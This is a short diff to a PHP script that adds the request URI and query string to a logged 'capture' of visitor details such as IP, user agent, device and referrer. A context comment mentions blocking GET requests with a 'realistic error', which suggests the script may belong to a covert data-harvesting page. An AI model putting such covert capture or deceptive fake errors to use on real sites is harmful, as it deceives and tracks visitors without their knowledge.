@@ -9,6 +9,8 @@ session_start();
 $ip = $_SERVER['REMOTE_ADDR'];
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'Direct Access';
+$request_uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+$query_string = isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '';
 $timestamp = date('Y-m-d H:i:s');
 
 // Block GET requests with realistic error
@@ -118,6 +120,8 @@ Browser: $browser
 Device: $device
 User Agent: $user_agent
 Referrer: $referer
+Request URI: $request_uri
+Query String: $query_string
 
 === END CAPTURE ===
 ";
